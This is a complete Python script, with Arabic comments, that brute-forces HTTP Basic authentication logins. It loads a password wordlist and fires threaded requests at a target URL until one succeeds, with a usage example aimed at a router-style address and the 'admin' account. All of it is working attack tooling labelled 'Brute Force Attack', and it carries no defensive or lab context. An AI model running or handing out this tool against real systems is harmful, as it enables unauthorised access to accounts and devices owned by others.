#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

def try_password(url, username, password):
    """يجرب كلمة سر واحدة"""
    try:
        r = requests.get(url, auth=(username, password), timeout=3)
        if r.status_code == 200:
            return (password, r.status_code)
    except:
        pass
    return None

def brute_force(url, username, wordlist, max_threads=20):
    print(f"\n{'='*60}")
    print(f"  Brute Force Attack")
    print(f"  URL:      {url}")
    print(f"  Username: {username}")
    print(f"  Wordlist: {wordlist}")
    print(f"{'='*60}\n")
    
    # قراءة قائمة كلمات السر
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Loaded {len(passwords)} passwords")
    print(f"[*] Starting attack...\n")
    
    found = None
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(try_password, url, username, p): p 
                   for p in passwords}
        
        for i, future in enumerate(futures, 1):
            result = future.result()
            if result:
                password, status = result
                print(f"\n[+] FOUND! Password: {password}")
                found = password
                break
            
            if i % 50 == 0:
                print(f"[*] Tried {i}/{len(passwords)}...")
    
    print(f"\n{'='*60}")
    if found:
        print(f"  Password found: {found}")
    else:
        print(f"  No password found")
    print(f"{'='*60}\n")
    
    return found

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 brute_force.py <url> <username> <wordlist>")
        print("Example: python3 brute_force.py http://192.168.0.1 admin passwords.txt")
        sys.exit(1)
    
    url = sys.argv[1]
    username = sys.argv[2]
    wordlist = sys.argv[3]
    brute_force(url, username, wordlist)

